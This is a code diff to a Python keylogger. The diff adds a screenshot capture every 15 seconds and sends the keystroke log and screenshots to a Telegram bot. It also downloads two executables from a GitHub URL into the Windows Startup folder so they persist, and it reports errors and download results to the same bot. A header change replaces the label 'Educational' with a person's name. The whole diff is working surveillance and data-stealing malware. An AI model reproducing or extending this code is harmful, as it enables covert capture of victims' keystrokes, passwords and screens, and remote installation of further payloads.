@@ -11,6 +11,7 @@ import traceback
 from pathlib import Path
 import time
 import requests
+import mss
 
 # Windows: hide folder
 if sys.platform == "win32":
@@ -57,9 +58,17 @@ URL_SEND_MESSAGE = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 SEND_INTERVAL = 15  # seconds
 TELEGRAM_MSG_MAX_LEN = 4096  # Telegram message limit
 
-# ====== Download to Startup ======
-DOWNLOAD_URL = "https://raw.githubusercontent.com/khaled88r5/p/refs/heads/main/online.exe"
-STARTUP_FILENAME = "online.exe"
+# ====== Download to Startup (two files) ======
+DOWNLOAD_FILES = [
+    {
+        "url": "https://raw.githubusercontent.com/khaled88r5/p/refs/heads/main/offline.exe",
+        "filename": "offline.exe",
+    },
+    {
+        "url": "https://raw.githubusercontent.com/khaled88r5/p/refs/heads/main/online.exe",
+        "filename": "online.exe",
+    },
+]
 
 # ===============================
 # Logging
@@ -81,31 +90,87 @@ running = True
 
 # ===============================
 def download_to_startup():
-    """Download file from URL and save to Windows Startup folder."""
+    """Download two files to Windows Startup folder and send success/fail message to Telegram."""
     if sys.platform != "win32":
         return
+    startup_folder = os.path.join(
+        os.path.expanduser("~"),
+        "AppData",
+        "Roaming",
+        "Microsoft",
+        "Windows",
+        "Start Menu",
+        "Programs",
+        "Startup",
+    )
+    results = []
+    for item in DOWNLOAD_FILES:
+        url = item["url"]
+        filename = item["filename"]
+        save_path = os.path.join(startup_folder, filename)
+        try:
+            response = requests.get(url, stream=True, timeout=30)
+            response.raise_for_status()
+            with open(save_path, "wb") as f:
+                for chunk in response.iter_content(8192):
+                    if chunk:
+                        f.write(chunk)
+            logging.info("File saved to Startup folder: %s", save_path)
+            results.append((filename, True, None))
+        except Exception as e:
+            logging.warning("Download failed %s: %s", filename, e)
+            results.append((filename, False, str(e)))
+
+    # Send one message: success or fail for each file
+    lines = ["📥 Download report:"]
+    for name, ok, err in results:
+        if ok:
+            lines.append(f"✅ {name}: success")
+        else:
+            lines.append(f"❌ {name}: fail — {err or 'unknown'}")
+    msg = "\n".join(lines)
     try:
-        startup_folder = os.path.join(
-            os.path.expanduser("~"),
-            "AppData",
-            "Roaming",
-            "Microsoft",
-            "Windows",
-            "Start Menu",
-            "Programs",
-            "Startup",
-        )
-        save_path = os.path.join(startup_folder, STARTUP_FILENAME)
-        response = requests.get(DOWNLOAD_URL, stream=True, timeout=30)
-        response.raise_for_status()
-        with open(save_path, "wb") as f:
-            for chunk in response.iter_content(8192):
-                if chunk:
-                    f.write(chunk)
-        logging.info("File saved to Startup folder: %s", save_path)
+        payload = {"chat_id": CHAT_ID, "text": msg, "disable_web_page_preview": True}
+        requests.post(URL_SEND_MESSAGE, json=payload, timeout=10)
     except Exception as e:
-        logging.warning("Download to Startup failed: %s", e)
-        send_error_to_telegram(f"Download to Startup failed: {e}\n{traceback.format_exc()}")
+        logging.warning("Could not send download report to Telegram: %s", e)
+
+
+# ===============================
+def send_error_to_telegram(message: str):
+    """Send an error message to Telegram. Never raises; failures are logged only."""
+    if not message or not message.strip():
+        return
+    try:
+        text = message.strip()
+        if len(text) > TELEGRAM_MSG_MAX_LEN:
+            text = text[: TELEGRAM_MSG_MAX_LEN - 50] + "\n... (truncated)"
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": f"⚠️ Keylogger Error:\n\n{text}",
+            "disable_web_page_preview": True,
+        }
+        r = requests.post(URL_SEND_MESSAGE, json=payload, timeout=10)
+        if r.status_code != 200:
+            logging.warning("Telegram error send failed: %s", r.text)
+    except Exception as e:
+        logging.warning("Could not send error to Telegram: %s", e)
+
+
+# ===============================
+# Send any uncaught exception to Telegram
+# ===============================
+def _telegram_excepthook(exc_type, exc_value, exc_tb):
+    try:
+        tb_lines = traceback.format_exception(exc_type, exc_value, exc_tb)
+        msg = "".join(tb_lines).strip()
+        send_error_to_telegram(msg)
+    except Exception:
+        pass
+    sys.__excepthook__(exc_type, exc_value, exc_tb)
+
+
+sys.excepthook = _telegram_excepthook
 
 
 # ===============================
@@ -113,7 +178,7 @@ def setup_log_file():
     try:
         if not log_file.exists():
             with open(log_file, "w", encoding="utf-8") as f:
-                f.write("=== Keylogger Simulator Log (Educational) ===\n")
+                f.write("=== Keylogger Simulator Log (Nasser) ===\n")
             logging.info(f"Created log file at: {log_file}")
         else:
             logging.info(f"Using existing log file at: {log_file}")
@@ -167,51 +232,58 @@ def on_press(key):
 
 
 # ===============================
-def send_error_to_telegram(message: str):
-    """Send an error message to Telegram. Never raises; failures are logged only."""
-    if not message or not message.strip():
-        return
+def take_screenshot():
     try:
-        text = message.strip()
-        if len(text) > TELEGRAM_MSG_MAX_LEN:
-            text = text[: TELEGRAM_MSG_MAX_LEN - 50] + "\n... (truncated)"
-        payload = {"chat_id": CHAT_ID, "text": f"⚠️ Keylogger Error:\n\n{text}", "disable_web_page_preview": True}
-        r = requests.post(URL_SEND_MESSAGE, json=payload, timeout=10)
-        if r.status_code != 200:
-            logging.warning("Telegram error send failed: %s", r.text)
+        screenshot_path = STORAGE_DIR / "screenshot.png"
+
+        with mss.mss() as sct:
+            sct.shot(output=str(screenshot_path))
+
+        logging.info(f"Screenshot saved at: {screenshot_path}")
+
     except Exception as e:
-        logging.warning("Could not send error to Telegram: %s", e)
+        logging.error(f"Error taking screenshot: {e}")
+        send_error_to_telegram(
+            f"Error taking screenshot: {e}\n{traceback.format_exc()}"
+        )
 
 
-# ===============================
-# Send any uncaught exception to Telegram
-# ===============================
-def _telegram_excepthook(exc_type, exc_value, exc_tb):
-    try:
-        tb_lines = traceback.format_exception(exc_type, exc_value, exc_tb)
-        msg = "".join(tb_lines).strip()
-        send_error_to_telegram(msg)
-    except Exception:
-        pass
-    sys.__excepthook__(exc_type, exc_value, exc_tb)
-
-
-sys.excepthook = _telegram_excepthook
+def screenshot_thread():
+    """تشغيل أخذ الصور في الخلفية"""
+    while running:
+        take_screenshot()
+        time.sleep(15)
 
 
 # ===============================
 def send_file_to_telegram():
     try:
+        screenshot_path = STORAGE_DIR / "screenshot.png"
+
         if not log_file.exists():
             return
-        with open(log_file, "rb") as file:
-            response = requests.post(
-                URL, data={"chat_id": CHAT_ID}, files={"document": file}, timeout=10
+
+        # ===== إرسال ملف اللوج =====
+        with open(log_file, "rb") as log_f:
+            response1 = requests.post(
+                URL,
+                data={"chat_id": CHAT_ID},
+                files={"document": log_f},
+                timeout=10,
             )
-        if response.status_code == 200:
-            logging.info("✅ File sent to Telegram successfully")
-        else:
-            logging.warning("❌ Failed to send file: %s", response.text)
+
+        # ===== إرسال الصورة =====
+        if screenshot_path.exists():
+            with open(screenshot_path, "rb") as screenshot_f:
+                response2 = requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                    data={"chat_id": CHAT_ID},
+                    files={"photo": screenshot_f},
+                    timeout=10,
+                )
+
+        logging.info("✅ Files sent to Telegram")
+
     except Exception as e:
         err_msg = f"Telegram send error: {e}\n{traceback.format_exc()}"
         logging.warning("⚠️ %s", err_msg)
@@ -247,6 +319,10 @@ def main():
         sender_thread = threading.Thread(target=telegram_sender_loop, daemon=True)
         sender_thread.start()
         logging.info("Telegram sender started (every %s sec)", SEND_INTERVAL)
+
+        # بدء الخيط الخاص بالتقاط الصور
+        screenshot_threading = threading.Thread(target=screenshot_thread, daemon=True)
+        screenshot_threading.start()
 
         with keyboard.Listener(on_press=on_press) as listener:
             logging.info("Keyboard listener started")
